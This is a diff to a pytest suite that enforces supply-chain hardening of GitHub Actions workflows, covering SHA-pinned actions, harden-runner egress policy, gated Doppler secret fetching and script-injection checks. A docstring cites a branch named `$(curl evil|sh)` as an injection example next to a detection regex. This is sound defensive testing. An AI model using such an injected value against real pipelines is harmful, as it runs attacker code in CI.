@@ -26,12 +26,11 @@ README = REPO / "README.md"
 
 WORKFLOW_FILES = sorted(WORKFLOWS.glob("*.yml"))
 ACTION_FILES = sorted(ACTIONS.glob("*/action.yml"))
-REUSABLE = [p for p in WORKFLOW_FILES if p.name != "ci.yml"]
+REUSABLE = [p for p in WORKFLOW_FILES if p.name in ("python-ci.yml", "python-docker-release.yml", "security.yml")]
+OWN = [p for p in WORKFLOW_FILES if p not in REUSABLE]
 
-# Our own composite actions are referenced by `@main` from inside the reusable
-# workflows: a reusable workflow cannot name its own ref, and the composite
-# must move with it. Everything else is pinned to a commit.
 SELF = "ChiefGyk3D/git-your-ship-together/"
+HARDEN_RUNNER = "step-security/harden-runner@"
 
 
 def load(path: Path) -> dict:
@@ -63,7 +62,7 @@ def all_steps(path: Path):
 
 
 def test_there_is_something_to_check():
-    assert REUSABLE, "no reusable workflows found - every test below passes vacuously"
+    assert len(REUSABLE) == 3, "expected the three reusable workflows"
     assert ACTION_FILES, "no composite actions found"
 
 
@@ -75,31 +74,31 @@ VERSION_COMMENT = re.compile(r"^\s*#\s*v\d+\.\d+(\.\d+)?\s*$")
 
 
 @pytest.mark.parametrize("path", WORKFLOW_FILES + ACTION_FILES, ids=lambda p: str(p.relative_to(REPO)))
-def test_every_third_party_action_is_pinned_to_a_sha_with_a_version_comment(path):
-    """A tag re-resolves on every run; a 40-hex SHA cannot."""
+def test_every_action_is_pinned_to_a_sha_with_a_version_comment(path):
+    """A tag re-resolves on every run; a 40-hex SHA cannot.
+
+    That includes references to this repository's own files. A reusable
+    workflow cannot name the commit it is running from, so a `@main`
+    self-reference would make a caller's pin only as strong as this repo's
+    default branch. The Doppler steps are inlined instead (see below).
+    """
     for number, line in enumerate(path.read_text().splitlines(), start=1):
+        if line.lstrip().startswith("#"):
+            continue  # the usage example in the header shows `@<sha>`
         match = USES.search(line)
         if not match:
             continue
         where = f"{path.relative_to(REPO)}:{number}"
-        if match["action"].startswith(SELF):
-            assert match["ref"] == "main", f"{where}: self-reference must be @main so it moves with the workflow"
-            continue
         action, ref = match["action"], match["ref"]
         assert SHA.match(ref), f"{where}: {action} is pinned to {ref!r}, not a commit SHA"
         assert VERSION_COMMENT.match(match["rest"]), f"{where}: {action} has no `# vX.Y.Z` comment after the SHA"
 
 
-def test_self_references_name_actions_that_exist():
-    """A typo in a `ChiefGyk3D/git-your-ship-together/.github/actions/<name>@main` reference fails only at run time,
-    in someone else's repository."""
-    for path in WORKFLOW_FILES:
-        for _, step in all_steps(path):
-            uses = str(step.get("uses", ""))
-            if not uses.startswith(SELF):
-                continue
-            rel = uses[len(SELF) :].split("@", 1)[0]
-            assert (REPO / rel / "action.yml").is_file(), f"{path.name} uses {uses}, but {rel}/action.yml is missing"
+@pytest.mark.parametrize("path", REUSABLE, ids=lambda p: p.name)
+def test_reusable_workflows_never_reference_this_repository_by_branch(path):
+    for _, step in all_steps(path):
+        uses = str(step.get("uses", ""))
+        assert not uses.startswith(SELF), f"{path.name} references {uses}; inline the steps so the caller's pin holds"
 
 
 @pytest.mark.parametrize("path", WORKFLOW_FILES, ids=lambda p: p.name)
@@ -124,11 +123,13 @@ def test_every_workflow_declares_read_only_top_level_permissions(path):
 # decision, not a side effect of adding a step.
 ALLOWED_WRITES = {
     # Codecov (python-ci), Docker Hub credentials (release), Snyk and the
-    # gitleaks licence (security) come from Doppler over OIDC.
+    # gitleaks licence (security) come from Doppler over OIDC; Scorecard
+    # publishes its result with the same OIDC identity.
     ("python-ci.yml", "test", "id-token"),
     ("python-docker-release.yml", "release", "id-token"),
     ("security.yml", "gitleaks", "id-token"),
     ("security.yml", "snyk", "id-token"),
+    ("security.yml", "scorecard", "id-token"),
     # Publishing the image, its signature, SBOM attestation and provenance.
     ("python-docker-release.yml", "release", "packages"),
     ("python-docker-release.yml", "release", "attestations"),
@@ -136,8 +137,13 @@ ALLOWED_WRITES = {
     ("python-docker-release.yml", "release", "security-events"),
     ("security.yml", "codeql", "security-events"),
     ("security.yml", "snyk", "security-events"),
+    ("security.yml", "scorecard", "security-events"),
     # dependency-review's summary comment on the pull request.
     ("security.yml", "dependency-review", "pull-requests"),
+    # This repository dogfoods security.yml on itself.
+    ("security-self.yml", "security", "security-events"),
+    ("security-self.yml", "security", "pull-requests"),
+    ("security-self.yml", "security", "id-token"),
 }
 
 
@@ -173,14 +179,34 @@ def test_every_checkout_refuses_to_persist_credentials(path):
         )
 
 
+@pytest.mark.parametrize("path", REUSABLE, ids=lambda p: p.name)
+def test_every_reusable_job_starts_with_harden_runner(path):
+    """The egress policy is only a policy if it is in place before anything else runs."""
+    for job_name, job in jobs(load(path)).items():
+        steps = steps_of(job)
+        if not steps:
+            continue  # a gate job with no steps that reach the network
+        first = str(steps[0].get("uses", ""))
+        assert first.startswith(HARDEN_RUNNER), f"{path.name}: job {job_name!r} does not start with harden-runner"
+        with_ = steps[0].get("with") or {}
+        assert with_.get("egress-policy") == "${{ inputs.egress-policy }}", (
+            f"{path.name}: job {job_name!r} harden-runner ignores the egress-policy input"
+        )
+
+
 # --- script injection -------------------------------------------------------
 
-UNTRUSTED = re.compile(r"\$\{\{\s*(github\.event\.|github\.head_ref|github\.ref_name|env\.)")
+UNTRUSTED = re.compile(r"\$\{\{\s*(github\.event\.|github\.head_ref|github\.ref_name|env\.|inputs\.)")
 
 
 @pytest.mark.parametrize("path", WORKFLOW_FILES + ACTION_FILES, ids=lambda p: str(p.relative_to(REPO)))
 def test_no_run_block_interpolates_untrusted_context(path):
-    """A branch named `$(curl evil|sh)` is a valid branch name. Values go through env:, not into the script."""
+    """A branch named `$(curl evil|sh)` is a valid branch name.
+
+    Values, including every caller-supplied command, go through env: and are
+    read by the shell as data. `bash -c "$COMMAND"` is the one sanctioned way
+    to run a caller's command string.
+    """
     for job_name, step in all_steps(path):
         body = step.get("run")
         if not isinstance(body, str):
@@ -189,12 +215,58 @@ def test_no_run_block_interpolates_untrusted_context(path):
         assert not found, f"{path.relative_to(REPO)}: job {job_name!r} interpolates {found.group(0)!r} into run:"
 
 
+# --- the Doppler steps are one thing, written in several places ------------
+
+
+def doppler_script(path: Path) -> list[str]:
+    """The `run:` bodies of every step named 'Decide how to authenticate...' in a file."""
+    return [
+        step["run"] for _, step in all_steps(path) if str(step.get("name", "")).startswith("Decide how to authenticate")
+    ]
+
+
+def test_the_inlined_doppler_script_matches_the_composite_action():
+    """Four copies, one source. The composite action is the source; a copy that drifts is a bug."""
+    composite = doppler_script(ACTIONS / "doppler-secrets" / "action.yml")
+    assert len(composite) == 1
+    copies = {path.name: doppler_script(path) for path in REUSABLE}
+    assert copies == {
+        "python-ci.yml": [composite[0]],
+        "python-docker-release.yml": [composite[0]],
+        "security.yml": [composite[0]] * 2,
+    }, "an inlined Doppler script differs from .github/actions/doppler-secrets/action.yml"
+
+
+@pytest.mark.parametrize("path", REUSABLE, ids=lambda p: p.name)
+def test_doppler_fetch_steps_are_gated_on_the_decision(path):
+    """Both fetch steps key off the decide step; an ungated fetch would run with an empty token."""
+    doc = load(path)
+    secrets = triggers(doc)["workflow_call"].get("secrets") or {}
+    assert "DOPPLER_TOKEN" in secrets, f"{path.name} does not declare the DOPPLER_TOKEN fallback secret"
+    fetches = [s for _, s in all_steps(path) if str(s.get("uses", "")).startswith("dopplerhq/secrets-fetch-action@")]
+    assert fetches, f"{path.name} never fetches from Doppler"
+    for step in fetches:
+        cond = step.get("if", "")
+        assert cond in ("steps.doppler.outputs.mode == 'oidc'", "steps.doppler.outputs.mode == 'token'"), (
+            f"{path.name}: fetch step {step.get('name')!r} is gated on {cond!r}"
+        )
+        with_ = step.get("with") or {}
+        for key in ("doppler-project", "doppler-config"):
+            assert with_.get(key) == "${{ inputs." + key + " }}", f"{path.name}: fetch step does not pass {key}"
+        if cond.endswith("'token'"):
+            assert with_.get("doppler-token") == "${{ secrets.DOPPLER_TOKEN }}"
+        else:
+            assert with_.get("doppler-identity-id") == "${{ inputs.doppler-identity-id }}"
+
+
 # --- shape ------------------------------------------------------------------
 
 
 @pytest.mark.parametrize("path", WORKFLOW_FILES, ids=lambda p: p.name)
 def test_every_job_has_a_timeout(path):
     for job_name, job in jobs(load(path)).items():
+        if "uses" in job:
+            continue  # a caller of a reusable workflow; the timeout lives inside
         assert job.get("timeout-minutes"), f"{path.name}: job {job_name!r} has no timeout-minutes"
 
 
@@ -228,32 +300,6 @@ def test_every_input_used_is_declared(path):
     assert used <= set(inputs), f"{path.name} reads undeclared inputs: {sorted(used - set(inputs))}"
 
 
-@pytest.mark.parametrize("path", REUSABLE, ids=lambda p: p.name)
-def test_doppler_secret_is_passed_through_to_the_composite(path):
-    """Every reusable workflow must accept DOPPLER_TOKEN and hand it to each fetch, or the fallback path is dead."""
-    doc = load(path)
-    secrets = triggers(doc)["workflow_call"].get("secrets") or {}
-    composite = SELF + ".github/actions/doppler-secrets@"
-    fetches = [s for _, s in all_steps(path) if str(s.get("uses", "")).startswith(composite)]
-    assert fetches, f"{path.name} never fetches from Doppler"
-    assert "DOPPLER_TOKEN" in secrets, f"{path.name} does not declare the DOPPLER_TOKEN fallback secret"
-    for step in fetches:
-        with_ = step.get("with") or {}
-        assert with_.get("token") == "${{ secrets.DOPPLER_TOKEN }}", f"{path.name}: a doppler-secrets step lacks token"
-        for key in ("project", "config", "identity-id"):
-            assert with_.get(key) == "${{ inputs.doppler-" + key + " }}", (
-                f"{path.name}: a doppler-secrets step does not pass {key} from inputs"
-            )
-
-
-def test_composite_action_never_fetches_without_a_decision():
-    """Both fetch steps are gated on the mode step; an ungated fetch would run with an empty token."""
-    doc = load(ACTIONS / "doppler-secrets" / "action.yml")
-    fetches = [s for s in doc["runs"]["steps"] if str(s.get("uses", "")).startswith("dopplerhq/secrets-fetch-action@")]
-    assert len(fetches) == 2
-    assert {s["if"] for s in fetches} == {"steps.mode.outputs.mode == 'oidc'", "steps.mode.outputs.mode == 'token'"}
-
-
 def test_ci_green_gate_needs_every_other_job():
     """Branch protection watches one job; a job left out of its needs merges red."""
     doc = load(WORKFLOWS / "python-ci.yml")
@@ -280,6 +326,16 @@ def test_release_signs_attests_and_records_provenance_only_after_a_push():
     )
 
 
+def test_a_publishing_build_never_reads_the_actions_cache():
+    """The cache is writable from any pull request; a poisoned layer in a signed release is unrecoverable."""
+    doc = load(WORKFLOWS / "python-docker-release.yml")
+    steps = {s.get("name"): s for s in steps_of(jobs(doc)["release"])}
+    push = steps["Build and push the multi-arch image"]["with"]
+    assert "cache-from" not in push and "cache-to" not in push
+    local = steps["Build for this runner and load it"]["with"]
+    assert "!inputs.push" in local["cache-from"], "the local build may use the cache only when not publishing"
+
+
 # --- documentation ----------------------------------------------------------
 
 
@@ -295,5 +351,5 @@ def test_readme_documents_every_input(path):
 def test_readme_names_every_workflow_and_the_composite():
     text = README.read_text()
     for path in REUSABLE:
-        assert f".github/workflows/{path.name}@main" in text, f"README.md does not show how to call {path.name}"
+        assert f".github/workflows/{path.name}@" in text, f"README.md does not show how to call {path.name}"
     assert ".github/actions/doppler-secrets" in text
